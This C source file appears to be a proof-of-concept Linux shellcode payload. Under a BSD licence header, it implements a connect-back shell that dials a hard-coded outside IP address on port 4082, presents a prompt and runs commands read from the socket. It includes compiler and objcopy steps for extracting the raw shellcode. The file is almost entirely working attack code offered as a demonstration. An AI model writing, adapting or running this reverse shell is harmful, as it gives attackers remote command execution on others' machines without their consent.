/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

/**
  This is only a PoC to demonstrate writing shellcode for Linux in C

  gcc -N -O0 -fno-stack-protector -nostdlib tls.c -fpic -o tls
  objcopy -O binary --only-section=.text tls tls.bin

  */
#include "include.h"

#define REMOTE_PORT 4082
#define REMOTE_HOST 0x0F932A105 // 5.161.50.249

void _start(void)
{
  struct sockaddr_in sa;
  int i, r;
  char buf[BUFSIZ];
  struct pollfd evts[1];
  data_t data;

  data.command_len = 0;
  data.shell_mode = 0;

  // create a socket
  data.s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

  sa.sin_family = AF_INET;
  sa.sin_port = htons(REMOTE_PORT);

  // connect to remote host
  sa.sin_addr.s_addr = REMOTE_HOST;

  r = connect(data.s, (struct sockaddr *)&sa, sizeof(sa));

  if (r >= 0)
  {
    char current[]="./";
    //PRINT_TEXT(STDOUT_FILENO, "Server started!\n");
    PRINT_TEXT(data.s, "Server started!\n> ");
    //uname_command(&data);
    //ls_command(&data, current);

    evts[0].fd = data.s;
    evts[0].events = POLLIN;

    // now loop until user exits or some other error
    for (;;)
    {
      r = poll(evts, 1, 1000);

      // error? bail out
      if (r < 0)
      {
        PRINT_TEXT(STDERR_FILENO, "poll() failed!\n");
        break;
      }

      // read from socket and write to stdin
      r = read(data.s, buf, BUFSIZ);
      if (!r)
        break;

      // write(in[1], buf, len);
      if (!data.shell_mode)
      {
        for (i = 0; i < r; i++)
        {
          if (buf[i] == '\n')
          {
            data.command[data.command_len] = 0;
            process_command(&data);
            continue;
          }
          data.command[data.command_len++] = buf[i];
        }

        if (data.command_len == 0)
        {
          PRINT_TEXT(data.s, "> ");
        }
      }
    }
  }
  //else
   // PRINT_TEXT(STDERR_FILENO, "connect() failed!\n");

  // shutdown socket
  shutdown(data.s, SHUT_RDWR);
  close(data.s);

  exit(0);
}
